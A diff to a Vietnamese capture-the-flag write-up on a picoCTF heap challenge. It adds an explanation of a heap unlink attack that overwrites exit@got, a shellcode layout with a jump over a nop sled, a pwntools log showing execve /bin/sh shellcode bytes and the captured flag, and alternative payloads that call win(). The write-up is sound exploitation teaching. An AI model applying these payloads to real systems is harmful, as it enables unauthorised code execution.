@@ -245,7 +245,9 @@ pwndbg> x/10x 0x08d45000
 0x8d45020:	0x00000000	0x00000000
 ```
 Chương trình cấp phát một chunk nhớ kích thước 0x108 = 264 bytes cho `first`. 8 bytes đầu tiên từ **0x8d45000** -> **0x8d45007** là header chứa metadata của chunk. Vùng nhớ thực sự chứa dữ liệu bắt đầu từ **0x08d45008**.
+
 ![chunks](chunk-allocated-CS.png)
+
 Tại thời điểm này, ta thấy rằng chương trình đã leak cho ta một địa chỉ trên Heap:
 ```python
 >>> hex(148131848)
@@ -350,7 +352,7 @@ pwndbg> x/10x 0x08d45720
 0x8d45730:	0x00000000	0x00000000	0x00000000	0x00000000
 0x8d45740:	0x00000000	0x00000000
 ```
-Bộ nhớ đã lấy chunk tại **0x08d45618** trong small bins để cấp phát choh `fiffth`. Vùng nhớ 0x80 bytes còn dư (0x108 - 0x88 = 0x80) sẽ được đẩy vào small bins khác.
+Bộ nhớ đã lấy chunk tại **0x08d45618** trong small bins để cấp phát cho `fiffth`. Vùng nhớ 0x80 bytes còn dư (0x108 - 0x88 = 0x80) sẽ được đẩy vào small bins khác.
 Lúc này cấu trúc của small bins:
 ```bash
 smallbins
@@ -364,7 +366,9 @@ smallbins
    exit(0);
 ```
 chunk nhớ **0x08d45000** được trỏ bởi `first` nằm trong small bins đã được đánh dấu là **freed**. Do đó lệnh `seventh=malloc(256)` sẽ cấp phát chunk này cho `seventh`. Nhưng trước đó, ta lại có thể ghi đè vào chunk này nhờ vào lệnh `gets(first)`.
+
 Đây là nơi ta sẽ trick bộ nhớ. Nhưng làm như thế nào. Ta sẽ dùng kỹ thuật **unlink**.
+
 Chunk **0x08d45000** nằm trong **double link list** của small bins sau khi được allocate cho `seventh`, bộ nhớ sẽ điều chỉnh con trỏ **forward** và **backward** của 2 chunk nằm trước và sau của **0x08d45000**. Quá trình unlink diễn ra như sau:
 ```
 fd + 12 = bk
@@ -380,3 +384,76 @@ bk = leak + 8
 exit@got = leak + 8
 ```
 Tại vị trí leak + 8 ta sẽ chèn shellcode vào. Như vậy khi gặp lệnh `exit(0)` Chương trình sẽ nhảy vào shellcode của ta thay vì gọi `exit()` (vì ta đã ghi đè địa chỉ got của exit thành leak+8).
+
+Tuy nhiên có 1 vấn đề nho nhỏ (nhưng không nhỏ) là 4 bytes tại vị trí leak + 16 cũng sẽ bị ghi đè do `bk + 8 = fd`. Vì vậy sẽ làm hỏng shellcode của ta. 
+
+Để bypass điều này, ta sẽ xây dựng shell code như sau:
+```
+exit@got - 12
+leak + 8
+asm("jmp aaa")
+asm("	nop")
+...
+asm("	nop")
+asm("aaa:")
+shellcode
+```
+Như vậy, cho dù 4 bytes ở giữa dãy `nop` có bị thay đổi, ta vẫn nhảy đến được shellcode.
+
+#### Exploit
+[Source exploit](ex.py)
+
+```bash
+...
+...
+[DEBUG] Received 0xa8 bytes:
+    'Oops! a new developer copy pasted and printed an address as a decimal...\n'
+    '162582536\n'
+    'you will write on first after it was freed... an overflow will not be very useful...\n'
+win     : 0x8048966
+exit_got: 0x804d02c
+leak    : 0x9b0d008
+...
+...
+[DEBUG] /usr/bin/x86_64-linux-gnu-as -32 -o /tmp/pwn-asm-2jsCcy/step2 /tmp/pwn-asm-2jsCcy/step1
+[DEBUG] /usr/bin/x86_64-linux-gnu-objcopy -j .shellcode -Obinary /tmp/pwn-asm-2jsCcy/step3 /tmp/pwn-asm-2jsCcy/step4
+[DEBUG] Sent 0x42 bytes:
+    00000000  20 d0 04 08  10 d0 b0 09  eb 0b 90 90  90 90 90 90  │ ···│····│····│····│
+    00000010  90 90 90 90  90 6a 68 68  2f 2f 2f 73  68 2f 62 69  │····│·jhh│///s│h/bi│
+    00000020  6e 89 e3 68  01 01 01 01  81 34 24 72  69 01 01 31  │n··h│····│·4$r│i··1│
+    00000030  c9 51 6a 04  59 01 e1 51  89 e1 31 d2  6a 0b 58 cd  │·Qj·│Y··Q│··1·│j·X·│
+    00000040  80 0a                                               │··│
+    00000042
+[*] Switching to interactive mode
+$ ls
+[DEBUG] Sent 0x3 bytes:
+    'ls\n'
+[DEBUG] Received 0x16 bytes:
+    'flag.txt  vuln\tvuln.c\n'
+flag.txt  vuln    vuln.c
+$ cat flag.txt
+[DEBUG] Sent 0xd bytes:
+    'cat flag.txt\n'
+[DEBUG] Received 0x1d bytes:
+    'picoCTF{what5_Aft3r_e274134c}'
+picoCTF{what5_Aft3r_e274134c}$  
+
+```
+
+#### Bonus
+Vì bài này chỉ cần gọi hàm win() là đủ. Thay vì gọi shellcode để lấy shell,
+ta có nhiều cách khác để khắc phụ vụ 4 bytes bị corrupt, chẳng hạn như payload sau:
+```
+exit@got - 12
+leak + 8
+asm("push 0x08048966")
+asm("call [esp]")
+```
+Trong đó **0x08048966** là địa chỉ hàm win(). Hoặc:
+```
+exit@got - 12
+leak + 8
+asm("mov edi, 0x08048966")
+asm("call 0x08048966")
+```
+Chỉ cần đoạn assembly <= 8 bytes thì sẽ không bị corrupt. Cần chú ý là shellcode không được chứa *0x0a* vì nó là ký tự kết thúc cho hàm `gets()` và shellcode sẽ không được inject hết vào heap.
